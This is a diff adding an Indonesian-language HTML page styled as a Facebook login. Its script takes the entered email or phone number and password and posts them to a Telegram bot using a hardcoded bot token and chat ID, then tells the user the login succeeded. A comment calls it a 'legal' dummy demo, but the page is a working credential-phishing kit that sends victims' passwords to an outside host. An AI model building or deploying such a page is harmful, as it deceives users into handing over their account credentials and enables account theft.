@@ -1,0 +1,102 @@
+<!DOCTYPE html>
+<html lang="id">
+<head>
+<meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1.0">
+<title>Login Facebook Demo</title>
+<style>
+  body {
+    font-family: Arial, sans-serif;
+    background-color: #f0f2f5;
+    display: flex;
+    justify-content: center;
+    align-items: center;
+    height: 100vh;
+  }
+
+  .login-box {
+    background: #fff;
+    padding: 40px;
+    border-radius: 8px;
+    width: 360px;
+    box-shadow: 0 4px 12px rgba(0,0,0,0.1);
+  }
+
+  .login-box h2 {
+    text-align: center;
+    color: #1877f2;
+    margin-bottom: 20px;
+  }
+
+  .login-box input[type="text"],
+  .login-box input[type="password"] {
+    width: 100%;
+    padding: 12px;
+    margin: 8px 0;
+    border-radius: 6px;
+    border: 1px solid #ccc;
+    box-sizing: border-box;
+  }
+
+  .login-box button {
+    width: 100%;
+    padding: 12px;
+    background: #1877f2;
+    color: white;
+    border: none;
+    border-radius: 6px;
+    font-size: 16px;
+    cursor: pointer;
+    margin-top: 10px;
+  }
+
+  .login-box button:hover {
+    background: #145dbf;
+  }
+
+  .small-text {
+    font-size: 12px;
+    color: #555;
+    text-align: center;
+    margin-top: 12px;
+  }
+</style>
+</head>
+<body>
+
+<div class="login-box">
+  <h2>Facebook</h2>
+  <form onsubmit="handleLogin(event)">
+    <input type="text" id="username" placeholder="Email atau Nomor HP">
+    <input type="password" id="password" placeholder="Kata Sandi">
+    <button type="submit">Masuk</button>
+  </form>
+  <p class="small-text">⚠️ Masukan Gmail atau nomor untuk login.</p>
+</div>
+
+<script>
+function handleLogin(e){
+  e.preventDefault();
+
+  const user = document.getElementById('username').value;
+  const pass = document.getElementById('password').value;
+
+  // Contoh pengiriman demo ke Telegram (legal: testing dummy)
+  const BOT_TOKEN = "8523169028:AAHPF3ElI_1bNeA-m33RMsqAEBL6qOnW0xY"; // ganti dengan token bot
+  const CHAT_ID = "7719159066";     // ganti dengan chat id
+
+  fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`, {
+    method: "POST",
+    headers: { "Content-Type": "application/json" },
+    body: JSON.stringify({
+      chat_id: CHAT_ID,
+      text: `[DEMO LOGIN]\nUser: ${user}\nPass: ${pass}`
+    })
+  })
+  .then(() => alert("Login berhasil"))
+  .catch(err => alert("Login gagal: " + err));
+}
+</script>
+
+</body>
+</html>
